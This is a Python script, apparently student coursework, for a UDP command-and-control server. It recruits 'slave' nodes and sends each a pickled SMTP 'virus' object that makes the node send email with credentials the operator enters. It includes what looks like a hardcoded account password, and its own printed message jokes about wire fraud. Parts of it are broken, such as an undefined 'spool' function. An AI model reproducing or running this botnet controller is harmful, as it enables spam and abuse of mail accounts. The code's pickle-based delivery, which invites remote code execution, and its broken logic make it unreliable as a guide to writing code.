from socket import *
import pickle
import threading
import smtp


def newSlave(server, clientAddress, info):

    # todo remake in TCP so slaves can be held

    virus = smtp.SMTP(info[0], info[1], info[2], info[3], info[4], info[5])

    payload = pickle.dumps(virus)

    server.sendto(payload, clientAddress)

    message, clientAddress = server.recvfrom(2048)
    print(f"\tMessage Recieved from node: "+message.decode())


def main():
    serverPort = 12000
    server = socket(AF_INET, SOCK_DGRAM)
    server.bind(("", serverPort))
    slaveNum = 0
    info = []
    threads = []

    amt = int(input("ammount of slaves: "))
    slaves = threading.Thread(target = spool, args=[amt])
    slaves.start()

    print("server starting...\n")
    run = input("run? ")
    timeout = input("server timeout: ")
    if timeout == "":
        server.settimeout(10.0)
    else:
        server.settimeout(float(timeout))

    if run == "":
        info = ["hellotest001smtp@gmail.com", "hellotest002smtp@gmail.com",
                "csc475assignment", "email_body.txt", "Test", "Test"]
    else:
        info[0] = input("sender email: ")
        info[1] = input("receiver email: ")
        info[2] = input("sender password: ")
        info[3] = input("file path: ")
        if info[3] == "":
            info[3] = None
        info[4] = input("subject: ")
        info[5] = input("body: ")

    print('The server is ready to destroy your enemies and get you arrested for wire fraud')

    input("start server? ")
    while True:
        print("Server Listening...")
        try:
            message, clientAddress = server.recvfrom(2048)
            print(f"\tMessage Recieved from node: "+message.decode())

            threads.append(threading.Thread(target=newSlave, args=(server, clientAddress, info)))
        except:
            print(f"current slaves: {len(threads)}")
            run = input("\tkeep collecting or run? ")
            if run == "run":
                for node in threads:
                    node.start()

    server.close()

if __name__ == "__main__":
    main()
